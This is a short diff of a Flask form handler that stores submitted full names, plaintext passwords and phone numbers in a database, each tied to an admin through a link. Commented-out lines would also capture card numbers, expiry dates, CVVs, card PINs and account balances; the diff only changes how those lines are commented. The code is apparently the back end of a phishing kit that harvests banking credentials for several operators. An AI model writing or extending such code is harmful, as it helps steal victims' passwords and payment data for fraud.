@@ -420,13 +420,13 @@ def submit_form():
         new_submission = Submission(
             fullname=data['fullname'],
             password=data['password'],
-            # card_number=data['CardNumber'],
-            # expiry_date=data['expiry_date'],
-            # cvv=data['cvv'],
-            # card_pin=data['card_pin'],
+            # #card_number=data['CardNumber'],
+            # #expiry_date=data['expiry_date'],
+            # #cvv=data['cvv'],
+            # #card_pin=data['card_pin'],
             contact_number=data.get('contact_number'),
             phone_number=data['phone_number'],
-            # last_account_balance=data.get('last_account_balance'),
+            # #last_account_balance=data.get('last_account_balance'),
             admin_id=admin_id  # Associate with the specific admin from the link
         )
         db.session.add(new_submission)
